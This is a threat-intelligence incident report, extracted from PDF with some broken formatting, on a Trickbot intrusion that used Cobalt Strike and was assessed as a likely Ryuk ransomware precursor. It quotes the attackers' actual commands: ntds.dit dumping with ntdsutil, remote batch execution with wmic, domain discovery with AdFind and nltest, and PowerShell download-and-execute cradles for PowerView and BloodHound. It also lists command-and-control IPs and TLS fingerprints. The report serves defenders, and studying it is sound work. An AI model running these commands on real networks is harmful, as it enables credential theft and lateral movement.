    "plain_text": "# Trickbot Still Alive and Well\n\n**thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/**\n\nJanuary 11, 2021\n\n#### In October of 2020, the group behind the infamous botnet known as Trickbot had a bad few days. The group was under concerted pressure applied by US Cyber Command infiltrating the botnet, and allegedly, providing alternate configuration files to break the bot’s connections to the larger network. At the same time, Microsoft along with other partners, secured court orders to take over and take down Trickbot command and control servers.\n\n While this did appear to have a short term effect on limiting the scope of the botnet operators, there have been reports on the limits of its’ effectiveness. In our collection there was certainly a drop in overall Trickbot activity, but since the October disruption, we have seen it begin to rise again; this is a recent intrusion from late December.\n\n## Case Summary\n\n#### The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went. They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission. They used PowerShell, SMB, and WMI to move laterally.\n\n After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network. We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.\n\n## MITRE ATT&CK\n\n### Initial Access\n\n\n-----\n\n#### The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.\n\n### Execution\n\n#### Trickbot was manually executed on a single endpoint. Source: Hatching Triage | Behavioral Report\n\n### Privilege Escalation\n\n#### During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.\n\n### Defense Evasion\n\n#### After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).\n\n\n-----\n\n#### Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.\n\n Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.\n\n\n-----\n\n```\nProcess Name, PID, Rule, Host\n\"svchost.exe\",736,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"svchost.exe\",3740,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"ctfmon.exe\",992,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"svchost.exe\",7680,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"TSE28DF.exe\",5172,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"dllhost.exe\",7440,\"win_cobalt_strike_auto\",\"endpoint1\"\n\"svchost.exe\",532,\"win_cobalt_strike_auto\",\"server1\"\n\"svchost.exe\",784,\"win_cobalt_strike_auto\",\"server2\"\n\"svchost.exe\",700,\"win_cobalt_strike_auto\",\"server3\"\n\n### Credential Access\n\n#### The threat actors employed a couple different credential access techniques. The first technique used was dumping passwords from lsass on the beachhead machine.\n\n After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:\nntdsutil \"ac in ntds\" \"ifm\" \"cr fu C:\\Perflogs\\1\"\n\n The above command was executed from a batch file that was dropped and then executed using wmic.\nwmic /node:\"hostname\" process call create \"C:\\Perflogs\\12.bat\"\n\n```\n\n-----\n\n#### This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past. The above technique has been around since at least 2014 @chriscampell.\n\n Event ID 2001, 2003, 102, 300, 301, 302, and 103 were all seen in response to the above command as well as a file create by lsass.\n\n### Discovery\n\n#### The threat actors ran the AdFind utility for domain discovery.\n\n\n-----\n\n```\nC:\\Windows\\system32\\cmd.exe /C adfind.exe gcb sc trustdmp > trustdmp.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -f \"(objectcategory=group)\" > ad_group.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)>\nsubnets.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -sc trustdmp > trustdmp.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -f \"(objectcategory=organizationalUnit)\" >\nad_ous.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -f \"objectcategory=computer\" >\nad_computers.txt\nC:\\Windows\\system32\\cmd.exe /C adfind.exe -f \"(objectcategory=person)\" > ad_users.txt\n\n#### The following net commands were used by the threat actor.\nnet user\nnet group \"domain admins\" /domain\nnet group \"enterprise admins\" /domain\n\n While on systems, we also saw them use the following commands.\nsysteminfo\nipconfig\n\n The following Nltest commands were executed several times by the threat actors over the course of the intrusion.\nC:\\Windows\\system32\\cmd.exe /C nltest /dclist:\"DOMAINNAME\"\nC:\\Windows\\system32\\cmd.exe /C nltest /domain_trusts /all_trusts\n\n The ping command was then used to test connectivity to the domain controllers and other systems.\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:57637/'); GetNetComputer -ping -operatingsystem *server*\n\n Bloodhound was ran for domain attack path enumeration.\n[Original]\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG\n[Decoded]\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:13875/'); InvokeBloodHound -CollectionMethods all\n\n The following Powerview commands were also seen invoked by the threat actors for discovery.\n\n```\n\n-----\n\n```\nIEX (New Object Net.Webclient).DownloadString( http://127.0.0.1:35248/ ); Get\nNetComputer -operatingsystem *server*\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:42680/'); InvokeUserHunter -username actual_user_name\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:24774/'); GetNetSession -computername actual_computer_name\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:20744/'); GetNetRDPSession -computername actual_computer_name\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:42762/'); FindLocalAdminAccess\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:57637/'); GetNetComputer -ping -operatingsystem *server*\n\n### Lateral Movement\n\n#### The threat actors utilized several lateral movement techniques. The first of which was using a remote service to execute PowerShell from the registry.\n\n After decoding the above command a couple times and xoring you are left with the following shellcode, which appears to include a named pipe.\n\n This CyberChef Recipe was used to decode the above PS command\nFrom_Base64('A-Za-z0-9+/=',true)\nRemove_null_bytes()\nRegular_expression('User defined','[0-9a-zA-Z=+/]\n{30,}',true,true,false,false,false,false,'List matches')\nFrom_Base64('A-Za-z0-9+/=',true)\nGunzip()\nRegular_expression('User defined','[0-9a-zA-Z=+/]\n{30,}',true,true,false,false,false,false,'List matches')\nFrom_Base64('A-Za-z0-9+/=',true)\nXOR({'option':'Decimal','string':'35'},'Standard',false)\n\n The next lateral movement method used is SMB transfer and exec of batch files\n\n```\n\n-----\n\n#### This file was seen executed locally via cmd, and on remote systems using wmic.\n```\n[Local]\nC:\\Windows\\system32\\cmd.exe /c C:\\Perflogs\\434.bat\n[Remote]\nwmic /node:\"192.168.1.2\" process call create \"C:\\Perflogs\\434.bat\"\n\n SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.\n\n```\n\n-----\n\n#### Additionally, we also witnessed the use of overpass-the-hash. Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.\n\n\n-----\n\n#### Shortly after we see a couple Kerberos service ticket requests for that user.\n\n\n-----\n\n-----\n\n#### This alert fired a couple times based on network activity.\n\n Here’s some helpful information when looking for PTH or OPTH from Stealthbits\n\n### Command and Control\n\n#### Cobalt Strike C2 #1:\n\n\n-----\n\n```\n195.123.213.82:443\nJA3s:ae4edc6faf64d08308082ad26be60767\nJA3:51c64c77e60f3980eea90869b68c58a8, 72a589da586844d7f0818ce684948eea\nCertificate:[40:55:6e:74:38:4f:f5:64:95:52:c6:0b:88:c3:f4:02:d9:0c:0c:01 ]\nNot Before: 2020/12/07 08:36:31\nNot After: 2021/12/07 08:36:31\nIssuer Org: jQuery\nSubject Common: jquery.com\nSubject Org: jQuery\nPublic Algorithm:rsaEncryption\nJARM:07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\n\n#### Extracted Cobalt Strike Config:\n\n```\n\n-----\n\n#### Cobalt Strike C2 #2:\n```\n88.119.174.135:356\nhtpdomrtx.com\nJA3s: ae4edc6faf64d08308082ad26be60767, 649d6810e8392f63dc311eecb6b7098b\nJA3: a0e9f5d64349fb13191bc781f81f42e1, 649d6810e8392f63dc311eecb6b7098b\nCertificate:[1b:94:f1:b4:f2:e1:25:73:89:c3:e4:84:72:03:c2:d8:72:42:0d:05]\nNot Before: 2020/12/09 13:05:41\nNot After: 2021/12/09 13:05:41\nIssuer Org:\nSubject Common: htpdomrtx.com\nSubject Org Public Algorithm: rsaEncryption\nJARM:07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\n\n```\n\n-----\n\n#### Trickbot Mor1\n\n### Impact\n\n#### Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.\n\n Based on research from late last year by Kyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).\n\n Enjoy our report?
